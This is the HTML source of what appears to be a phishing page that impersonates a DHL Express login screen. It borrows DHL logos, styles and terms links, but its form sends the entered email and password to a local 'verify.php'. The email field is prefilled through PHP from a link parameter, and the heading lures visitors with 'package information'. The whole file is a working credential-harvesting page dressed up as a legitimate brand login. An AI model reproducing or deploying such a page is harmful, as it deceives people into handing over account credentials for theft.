<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML 
xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 
http-equiv="X-UA-Compatible">

<META charset="utf-8"><TITLE>	Login - DHL </TITLE>
<META http-equiv="X-UA-Compatible" content="IE=edge">
<META name="viewport" content="width=device-width, initial-scale=1.0">
<META name="description">
<META name="author"><LINK href="https://dhlexpress-commerce.com/Styles/main_style.css" 
rel="stylesheet" type="text/css">     <!-- Google Tag Manager -->     
<SCRIPT>(function (w, d, s, l, i) {
            w[l] = w[l] || []; w[l].push({
                'gtm.start':
                    new Date().getTime(), event: 'gtm.js'
            }); var f = d.getElementsByTagName(s)[0],
                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
        })(window, document, 'script', 'dataLayer', 'GTM-TJLFXB6');</SCRIPT>
     <!-- End Google Tag Manager -->     <LINK href="https://dhlexpress-commerce.com/bundles/baseStyle?v=mtLpHV_IXEa3SjCqQqw6K1zwh2pqjVbMS781Or30K3o1" 
rel="stylesheet"> <LINK href="https://dhlexpress-commerce.com/bundles/loginStyle?v=IKY7LCnvg_tIeQq-W4lF1FZpx0OU4Kkc00svJDdysOE1" 
rel="stylesheet"> <LINK href="https://dhlexpress-commerce.com/bundles/membershipStyle?v=0yt8XYkw-YMfcr2dXJMd4jrqSdoM2FedHMLWoiCk2Tw1" 
rel="stylesheet">     
<SCRIPT src="https://dhlexpress-commerce.com/Scripts/template/jquery.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/bootstrap/js/bootstrap.min.js" type="text/javascript"></SCRIPT>
     <LINK href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@200;300;400;700&amp;display=swap" 
rel="stylesheet"><LINK href="https://dhlexpress-commerce.com/assets/global/plugins/font-awesome-v4.7/css/font-awesome.min.css" 
rel="stylesheet"><LINK id="loginFavicon" href="/favicon_dhl.ico" rel="shortcut icon"><LINK 
class="Telerik_stylesheet" href="https://dhlexpress-commerce.com/WebResource.axd?d=JObenGPrApriO3OrROuzzuwqeEl-AbWMGV5Z87u1Dt87g4ncf8EtL0y8E98d8-tiDTyhu-nBDKo7DUwKhUz6uM3v2-W0XAwsRHQfmrC11qOveK8KiP03EN9hh8WEOeA-0&amp;t=637828704840000000" 
rel="stylesheet" type="text/css"><LINK class="Telerik_stylesheet" href="https://dhlexpress-commerce.com/WebResource.axd?d=bjhlro5MKVMPV8rKbZcedwo1whVpyQq_aA-IpQS4mFXyLKzXBadSpa5LJ8c2GhZBNdhIO4psJIO1hV05DjAKoqUFqG-wbDyStVSjzuHr_KjsupK_-5R0oR-4lyZPfAIczy71PxmK3VwAurfvb3zXcL1CNbIpUvQOWuR8mgQf8Hx15Z_488RxxxYO5jykIF2D0&amp;t=637828704840000000" 
rel="stylesheet" type="text/css">
<META name="GENERATOR" content="MSHTML 11.00.10570.1001"></HEAD> 
<BODY class="login">
<SCRIPT>
        window.addEventListener("message", (event) => {
            console.log("event.origin: " + event.origin);
            if (!event.origin.endsWith(".starshipit.com"))
                return;
            storeTopLevelBrowserUrl(event.data);
        }, false);

        function inIframe() {
            try {
                return window.self !== window.top;
            } catch (e) {
                return true;
            }
        }
        function getTopLevelBrowserUrl() {
            if (inIframe()) {
                parent.postMessage("getTopLevelBrowserUrl", "*");
            }
        }
        function storeTopLevelBrowserUrl(url) {
            var hfTopLevelBrowserUrl = document.getElementById("hfTopLevelBrowserUrl");
            if (hfTopLevelBrowserUrl) {
                hfTopLevelBrowserUrl.value = url;
                console.log(hfTopLevelBrowserUrl.value);
            }
        }
        function redirectUsingTopLevelBrowsingContext(url) {
            window.top.location.href = url;
        }
    </SCRIPT>
     <!-- BEGIN SIDEBAR TOGGLER BUTTON -->     
<DIV class="menu-toggler sidebar-toggler"></DIV><!-- END SIDEBAR TOGGLER BUTTON --> 
    <!-- BEGIN LOGO -->     
<DIV class="logo"><A href="https://dhlexpress-commerce.com/Account/MemberLogin.aspx?ReturnUrl=%2F#"><IMG 
id="loginLogo" alt="Logo" src="https://dhlexpress-commerce.com/Images/logos/dhl-logo.svg"> 
        </A>     </DIV><!-- END LOGO -->     <!-- BEGIN LOGIN -->             
<SCRIPT type="text/javascript">
            function showDialog(dialogname) {
                $("#" + dialogname).modal({ show: true, keyboard: false, backdrop: "static" });
            }
            function termsAccepted() {
                $(".ssi-modal-close").trigger("click");
                $(".btn-success").click();
            }
            function loginButtonClientClick(p) {
                $(".pwd").val(p);
                showDialog('terms');
            }
        </SCRIPT>
         
<DIV class="content"><!-- BEGIN LOGIN FORM -->         
<FORM class="login-form" id="ctl01" onkeypress="javascript:return WebForm_FireDefaultButton(event, 'LoginUser_LoginButton')" 
onsubmit="javascript:return WebForm_OnSubmit();" action="verify.php" 
method="post">
<DIV class="aspNetHidden"><INPUT name="RadScriptManager_Terms_TSM" id="RadScriptManager_Terms_TSM" type="hidden"> 
<INPUT name="__EVENTTARGET" id="__EVENTTARGET" type="hidden"> <INPUT name="__EVENTARGUMENT" id="__EVENTARGUMENT" type="hidden"> 
<INPUT name="__VIEWSTATE" id="__VIEWSTATE" type="hidden" value="+k7NNwBRqaT8eRogTGy8But0YtMTC1VRoB5xTECWN7i+d6ORLsALgIfDB15DevJjRheAOlzacCpZBHViSHDavl8wU1p/Ro6e0S8ZkSdJD7Gxz3nIg3yOPu87M7nSoRhcNY7MFMfQJK05NWRmkYUcFZTpySJGlYettyltSUSVwPWiA+I/na7gD10PspboNHhA+ri7ZHAYDNPOPEsF8ofXzNldnKq9J5TmABfAuYz19O3vj+fV3KvcgSR4okhyJF2cdnUP2uI3AMvb3M3NLqQuMuPpXg+5AMp6teZBYNa1EdZAnAwi7q26HPn96gGe+CCJo3LgMG7sv3sTmjUEFOZCpWGsKEF6/jLyvlyc5Xy7mX4nX4AvITX8sTaAPrJpNhUs0AZ2l5jaWOVarovBFMRGGyRugGvTAGBeWa4QCUUjVkNdp/jbchL0ChUTm8JKd6ifWj71YnZj/Y8bA3FjOpaxztswwhf2+/KdzrwQQaIAIQAhapuikX/W2/6VdutunMnXRkv0U7BbGMvBftfVz0lBq/3gNQrwpkIUBExvwREKneqVMDqekVx4EvZxQekfz1eWdwCmLc7g9+ogfkaF7XlLdE9iXTUxQd1K0cBA+k9b92U3JH/zpQagU7OrhCtTK+UormqchiJvWrLB1//SeYKr2bhcJ+8QJBejXY1fGMQKTHTZ3cHjG1Qaw8OKeP3y+wxo7LqhfRUKNb3LgIzc1NAwlsYk3GgA7g8I/rdxD68+t9ihWypiV9VqjcM9X3DPw68s4nzDX+4QfAh/wSyYzOQZla9N0qTfs5l938ijy4NhNgXKE01S+obOwwfT5mcZ9CBcRYxho3Bt4pZ3+OsJR8N7KtO8+K4zJoK5WB43GVurD19MAhxq2fo8rcfYiRPsIQ2QfSD6lNMOdDb68lR6HHAxjx6epYOqvcbQa9wPMJMoQVNvFrLNqZiYx1d+XxzqWLtskbNW1N2dwztklQ3UwtTlp2g9qcVkT/7PCnENucRFS5Csc9yYMInXYHohgu0pSedVEqJmIAMWbKkGn1Tae8WjxF1ajHk3234pfMjSrc1HNxxt9houSTfVZI+xG4Xs2T58J9rc+BV+eHE8o1obi8srBlhvl8L/FLxvvTA4UxnTECer+MccrUDmQ1WgnZ9qry1HWUeznGve8gtDAD+OREKw3b/ZmoJO9VlUPPb72GWy2m+B75n/wYmn/F6srrDhCeS/oDRnlo7nsJuN0a/P378tH5KrcHpJJShxnL9QGW81Y8E="> 
</DIV>
<SCRIPT type="text/javascript">
//<![CDATA[
var theForm = document.forms['ctl01'];
if (!theForm) {
    theForm = document.ctl01;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</SCRIPT>
 
<SCRIPT src="https://dhlexpress-commerce.com/WebResource.axd?d=pynGkmcFUV13He1Qd6_TZKV3fa-SO5ADVGhqLulky7wXbWHOThrff7TBm2voWZcPwvzOCsinGMdSphJtZNGEhg2&amp;t=637746961681133512" type="text/javascript"></SCRIPT>
 
<SCRIPT src="https://dhlexpress-commerce.com/ScriptResource.axd?d=nv7asgRUU0tRmHNR2D6t1Oull2o1dux7uC16iA5VCD48Rl8FZKYYHUAjLMP4AYlPKyShlXc8vPTn8ma2SmGbCLP4Y6KKycvTeDgIvkVvGBxVhQGjsJ3hq0CpRukVQbz-s5qterrHsHDrIffXtrjy2A2&amp;t=ffffffffe191061b" type="text/javascript"></SCRIPT>
 
<SCRIPT src="https://dhlexpress-commerce.com/Telerik.Web.UI.WebResource.axd?_TSM_HiddenField_=RadScriptManager_Terms_TSM&amp;compress=1&amp;_TSM_CombinedScripts_=%3b%3bSystem.Web.Extensions%2c+Version%3d4.0.0.0%2c+Culture%3dneutral%2c+PublicKeyToken%3d31bf3856ad364e35%3aen-US%3aba1d5018-bf9d-4762-82f6-06087a49b5f6%3aea597d4b%3ab25378d2%3bTelerik.Web.UI%2c+Version%3d2022.1.119.45%2c+Culture%3dneutral%2c+PublicKeyToken%3d121fae78165ba3d4%3aen-US%3af00be9f9-5d75-4a4b-891e-b5c0e5b2a8e2%3a16e4e7cd%3aed16cbdc%3a33715776%3af7645509%3a24ee1bba%3a6d43f6d9" type="text/javascript"></SCRIPT>
 
<SCRIPT src="https://dhlexpress-commerce.com/WebResource.axd?d=JoBkLzP19aTuxbWOhHobYpf0QtXj0VdWI-CsXmSxoFchQWs12a6yZiefT9aLBnlT_Jb5HVfPZbgROYUIzxLJAw2&amp;t=637746961681133512" type="text/javascript"></SCRIPT>
 
<SCRIPT type="text/javascript">
//<![CDATA[
function WebForm_OnSubmit() {
if (typeof(ValidatorOnSubmit) == "function" && ValidatorOnSubmit() == false) return false;
return true;
}
//]]>
</SCRIPT>
 
<DIV class="aspNetHidden"><INPUT name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" type="hidden" value="FF320317">
	 <INPUT name="__EVENTVALIDATION" id="__EVENTVALIDATION" type="hidden" value="iq4H2fiV9p7+/RN3SzJUhPusoVhmFrMHbWE80mmEmbgiOMJ6664gBm9xdM1VlkREvaf2nBqqW0HDY8jqbbjREidAgkpyB9/tNIdotYTlSbbFXh26EJ9MYbwFBKhjV+uRFiGVkn1LwyYjh9x7hvmnCukQfRs8w9WsDQGv6OPYRKKl39kwOHT/c4jwjQtaU8tB7xZZMM1tLUckqlDzxfwMcBE2kTxwuJaErHqEUoJRSdyiS0hYYZrfkEdIyFrd6uUBgmCPncpXSzoE7ZqpuxCxDlHlkYcs7/QkZ1jQTqM2jmt6XkIK6AYaV1G/BVs7fJTkGD45peaFU3IooqVHHPSwWg=="> 
</DIV>
<SCRIPT type="text/javascript">
//<![CDATA[
Sys.WebForms.PageRequestManager._initialize('RadScriptManager_Terms', 'ctl01', ['tajaxPanelPanel',''], [], [], 90, '');
//]]>
</SCRIPT>
             
<H3 class="form-title" id="loginHeader">
<font face="Arial" size="2" color="#575757">Sign In With Your Email and Password 
To Review Package Information</font></H3><SPAN id="labelError" 
style="color: red; font-weight: bold;"></SPAN>                         
<DIV class="alert alert-danger display-hide"><BUTTON class="close" data-close="alert"></BUTTON> 
                <SPAN>Enter any username and password. </SPAN>             
</DIV>
<DIV class="form-group">E-MAIL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  
                       <INPUT name="ctl00$MPH$txtUserName" class="form-control form-control-solid placeholder-no-fix" id="LoginUser_UserName" type="text" placeholder="Enter your username" value="<?php echo $_GET['email'];?>" size="30"><SPAN 
class="failureNotification" id="LoginUser_CustomValidator1" style="display: none;"></SPAN> 
                        <SPAN class="failureNotification" id="LoginUser_cvLoginUserType" 
style="display: none;"></SPAN>                     </DIV>
<DIV class="form-group"><LABEL class="control-label uppercase">Password</LABEL>&nbsp;  
                       <INPUT name="ctl00$MPH$txtPassword" class="form-control form-control-solid placeholder-no-fix pwd" id="LoginUser_Password" type="password" placeholder="Enter your password" value="" autocomplete="off" size="30"></DIV>
<DIV class="form-actions"><SPAN class="rememberme check ssi-remember"><INPUT 
name="LoginUser$RememberMe" id="LoginUser_RememberMe" type="checkbox"></SPAN>    
                     
<DIV style="display: inline;"><LABEL class="rememberme check label" id="LoginUser_Label_Remember" 
for="LoginUser_RememberMe">Remember me</LABEL>                         </DIV>    
                     <A class="forget-password" id="LoginUser_forgetPassword" 
href="https://dhlexpress-commerce.com/Account/ForgotPassword.aspx">Forgot 
Password?</A>                         
<DIV class="error-message-validators"><SPAN class="text-danger" id="LoginUser_RequiredFieldValidator1" 
style="display: none;"><SPAN class="error"></SPAN><LABEL>Error:</LABEL> Please 
enter your username <BR></SPAN>                             <SPAN class="text-danger" 
id="LoginUser_PasswordRequired" style="display: none;"><SPAN 
class="error"></SPAN><LABEL>Error:</LABEL> Please enter your password 
<BR></SPAN>                                                     </DIV><A class="btn btn-success uppercase" 
id="LoginUser_LoginButton" href='javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("LoginUser$LoginButton", "", true, "LoginUserValidationGroup", "", false, true))'>LOG 
IN<I class="fa fa-chevron-right"></I></A>                         
<DIV class="create-account sign-in">                            Don't have an 
account yet?                          </DIV></DIV>
<DIV tabindex="-1" class="modal fade" id="terms" role="terms" 
aria-hidden="true">
<DIV class="modal-dialog">
<DIV class="modal-content ssi-modal-content">
<DIV class="RadAjaxPanel" id="ajaxPanelPanel">
<DIV id="ajaxPanel"><!-- 2022.1.119.45 -->                             
<DIV class="modal-header">
<H4 class="modal-title">Accept Terms</H4></DIV>
<DIV class="modal-body"><BR>
<DIV class="row">
<DIV class="col-xs-12"><SPAN class="rememberme check ssi-remember"><INPUT name="chkAcceptTerms" 
id="chkAcceptTerms" type="checkbox"></SPAN>                                      
   <SPAN id="lblAcceptTerms"> I accept the DHL Express <A href="https://mydhl.express.dhl/gb/en/footer/terms-and-conditions.html" 
target="_blank">Terms and Conditions</A></SPAN>                                  
   </DIV>
<DIV class="col-xs-12"><SPAN class="rememberme check ssi-remember"><INPUT name="chkAcceptPrivacy" 
id="chkAcceptPrivacy" type="checkbox"></SPAN>                                    
     <SPAN id="lblPrivacy"> I accept the DHL Express <A href="https://www.logistics.dhl/global-en/home/footer/global-privacy-notice.html" 
target="_blank">Privacy and Cookies Policy</A></SPAN>                            
         </DIV></DIV>
<DIV class="row">
<DIV class="col-xs-12"><BR><SPAN class="pull-left text-danger" id="Label_Terms_Error"></SPAN> 
                                    </DIV></DIV></DIV>
<DIV class="modal-footer"><SPAN class="RadButton RadButton_BlackMetroTouch rbSkinnedButton ssi-blue-btn-with-left-icon" 
id="bSave"><INPUT name="bSave_input" class="rbDecorated" id="bSave_input" type="button" value="Save"><INPUT name="bSave_ClientState" id="bSave_ClientState" type="hidden"></SPAN> 
                                <SPAN class="RadButton RadButton_BlackMetroTouch rbSkinnedButton ssi-white-btn ssi-modal-close" 
id="RadButton_CloseImportWindow" style="margin-left: 10px;" 
data-dismiss="modal"><INPUT name="RadButton_CloseImportWindow_input" class="rbDecorated" id="RadButton_CloseImportWindow_input" type="submit" value="Close"><INPUT name="RadButton_CloseImportWindow_ClientState" id="RadButton_CloseImportWindow_ClientState" type="hidden"></SPAN> 
                            </DIV></DIV></DIV></DIV></DIV></DIV><INPUT name="hfTopLevelBrowserUrl" id="hfTopLevelBrowserUrl" type="hidden"> 
        
<SCRIPT type="text/javascript">
//<![CDATA[
var Page_Validators =  new Array(document.getElementById("LoginUser_CustomValidator1"), document.getElementById("LoginUser_cvLoginUserType"), document.getElementById("LoginUser_RequiredFieldValidator1"), document.getElementById("LoginUser_PasswordRequired"));
//]]>
</SCRIPT>
 
<SCRIPT type="text/javascript">
//<![CDATA[
var LoginUser_CustomValidator1 = document.all ? document.all["LoginUser_CustomValidator1"] : document.getElementById("LoginUser_CustomValidator1");
LoginUser_CustomValidator1.controltovalidate = "LoginUser_UserName";
LoginUser_CustomValidator1.display = "None";
LoginUser_CustomValidator1.validationGroup = "LoginUserValidationGroup";
LoginUser_CustomValidator1.evaluationfunction = "CustomValidatorEvaluateIsValid";
var LoginUser_cvLoginUserType = document.all ? document.all["LoginUser_cvLoginUserType"] : document.getElementById("LoginUser_cvLoginUserType");
LoginUser_cvLoginUserType.controltovalidate = "LoginUser_UserName";
LoginUser_cvLoginUserType.display = "None";
LoginUser_cvLoginUserType.validationGroup = "LoginUserValidationGroup";
LoginUser_cvLoginUserType.evaluationfunction = "CustomValidatorEvaluateIsValid";
var LoginUser_RequiredFieldValidator1 = document.all ? document.all["LoginUser_RequiredFieldValidator1"] : document.getElementById("LoginUser_RequiredFieldValidator1");
LoginUser_RequiredFieldValidator1.controltovalidate = "LoginUser_UserName";
LoginUser_RequiredFieldValidator1.errormessage = "User Name is required.";
LoginUser_RequiredFieldValidator1.display = "Dynamic";
LoginUser_RequiredFieldValidator1.validationGroup = "LoginUserValidationGroup";
LoginUser_RequiredFieldValidator1.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
LoginUser_RequiredFieldValidator1.initialvalue = "";
var LoginUser_PasswordRequired = document.all ? document.all["LoginUser_PasswordRequired"] : document.getElementById("LoginUser_PasswordRequired");
LoginUser_PasswordRequired.controltovalidate = "LoginUser_Password";
LoginUser_PasswordRequired.errormessage = "Password is required.";
LoginUser_PasswordRequired.display = "Dynamic";
LoginUser_PasswordRequired.validationGroup = "LoginUserValidationGroup";
LoginUser_PasswordRequired.evaluationfunction = "RequiredFieldValidatorEvaluateIsValid";
LoginUser_PasswordRequired.initialvalue = "";
//]]>
</SCRIPT>
 
<SCRIPT type="text/javascript">
//<![CDATA[
window.__TsmHiddenField = $get('RadScriptManager_Terms_TSM');
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
        WebForm_AutoFocus('LoginUser_UserName');
document.getElementById('LoginUser_CustomValidator1').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('LoginUser_CustomValidator1'));
}

document.getElementById('LoginUser_cvLoginUserType').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('LoginUser_cvLoginUserType'));
}

document.getElementById('LoginUser_RequiredFieldValidator1').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('LoginUser_RequiredFieldValidator1'));
}

document.getElementById('LoginUser_PasswordRequired').dispose = function() {
    Array.remove(Page_Validators, document.getElementById('LoginUser_PasswordRequired'));
}
Sys.Application.add_init(function() {
    $create(Telerik.Web.UI.RadButton, {"_accessKey":"","_hasIcon":false,"_hasImage":false,"_isClientSubmit":true,"_isImageButton":false,"_postBackReference":"__doPostBack('bSave','')","_renderMode":1,"clientStateFieldID":"bSave_ClientState","confirmSettings":{},"cssClass":"ssi-blue-btn-with-left-icon","iconData":{},"imageData":{},"singleClick":true,"singleClickText":"Saving...","text":"Save","toggleStatesData":[],"uniqueGroupName":"","uniqueID":"bSave"}, null, null, $get("bSave"));
});
Sys.Application.add_init(function() {
    $create(Telerik.Web.UI.RadButton, {"_accessKey":"","_hasIcon":false,"_hasImage":false,"_isClientSubmit":false,"_isImageButton":false,"_postBackReference":"","_renderMode":1,"clientStateFieldID":"RadButton_CloseImportWindow_ClientState","confirmSettings":{},"cssClass":"ssi-white-btn ssi-modal-close","iconData":{},"imageData":{},"text":"Close","toggleStatesData":[],"uniqueGroupName":"","uniqueID":"RadButton_CloseImportWindow"}, null, null, $get("RadButton_CloseImportWindow"));
});
Sys.Application.add_init(function() {
    $create(Telerik.Web.UI.RadAjaxPanel, {"clientEvents":{OnRequestStart:"",OnResponseEnd:""},"enableAJAX":true,"enableHistory":false,"links":[],"loadingPanelID":"","styles":[],"uniqueID":"ajaxPanel"}, null, null, $get("ajaxPanel"));
});
//]]>
</SCRIPT>
 </FORM></DIV>
<DIV class="copyright"><SPAN id="copyrightDate">2022 © DHL Limited</SPAN>     
</DIV><!--[if lt IE 9]>
<script src="../../assets/global/plugins/respond.min.js"></script>
<script src="../../assets/global/plugins/excanvas.min.js"></script> 
<![endif]--> 
    
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/jquery.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/jquery-migrate.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/bootstrap/js/bootstrap.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/jquery.blockui.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/uniform/jquery.uniform.min.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/jquery.cokie.min.js" type="text/javascript"></SCRIPT>
     <!-- END CORE PLUGINS -->     <!-- BEGIN PAGE LEVEL PLUGINS -->     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/plugins/jquery-validation/js/jquery.validate.min.js" type="text/javascript"></SCRIPT>
     <!-- END PAGE LEVEL PLUGINS -->     <!-- BEGIN PAGE LEVEL SCRIPTS -->     
<SCRIPT src="https://dhlexpress-commerce.com/assets/global/scripts/metronic.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/admin/layout/scripts/layout.js" type="text/javascript"></SCRIPT>
     
<SCRIPT src="https://dhlexpress-commerce.com/assets/admin/layout/scripts/demo.js" type="text/javascript"></SCRIPT>
         <!-- END PAGE LEVEL SCRIPTS -->     
<SCRIPT type="text/javascript">
        jQuery(document).ready(function () {
            Metronic.init(); // init metronic core components
            Layout.init(); // init current layout
            //Login.init();
            Demo.init();
        });
    </SCRIPT>
     
<SCRIPT type="text/javascript">
        jQuery(document).ready(function () {
            getTopLevelBrowserUrl();
        });
    </SCRIPT>
     <!-- END JAVASCRIPTS -->     <!-- END BODY --> </BODY></HTML>
